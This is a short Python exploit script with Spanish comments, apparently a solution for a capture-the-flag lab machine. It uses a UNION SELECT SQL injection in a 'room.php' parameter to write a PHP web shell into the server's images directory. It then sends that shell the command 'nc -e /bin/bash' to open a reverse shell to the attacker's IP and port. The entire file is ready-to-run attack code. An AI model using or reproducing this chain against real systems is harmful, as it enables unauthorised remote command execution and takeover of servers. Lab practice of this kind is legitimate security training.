#!/usr/bin/python3

import sys
import time
import requests
import signal

from pwn import *

def def_handler(sig, frame):

        print("\n[+] Saliendo . . .\n")
        sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Aqui usamos una condicional para ver si le estamos pasando de manera correcta el nombre de archivo a crear con el codigo malicioso .php
if len(sys.argv) != 2:
        print("\n[!] Uso: %s filename\n" % sys.argv[0])
        sys.exit(1)

# Funcion principal del exploit basandonos en una Injeccion SQL para mediante un ataque de UNION SELECT, introducir un archivo malicioso PHP y cargarlo en la ruta /images/ para luego apuntar con otra peticion
# para ejecutar comandos desde el archivo WEBSHELL malicioso que acabamos de crear y obtener un RCE 
def makeRequest(filename):
        p1 = log.progress("Tramitando la subida de archivo")
        p1.status("Subiendo")
        time.sleep(1)

        r = requests.get("""http://10.10.10.143/room.php?cod=-1 union select 1,"<?php system($_REQUEST['cmd']); ?>",3,4,5,6,7 into outfile '/var/www/html/images/%s.php'""" % filename)
# La data para tramitar en la siguiente peticion
        p1.status("Ejecutando el RCE para conseguir una Rv_Shell")
        time.sleep(1)
# Cambia tu direccion IP y el puerto
        post_data = {
                'cmd' : 'nc -e /bin/bash 10.10.15.4 443'
        }

        r = requests.post("http://10.10.10.143/images/%s.php" % filename, data=post_data)

if __name__ == '__main__':

        filename = sys.argv[1]
        makeRequest(filename)
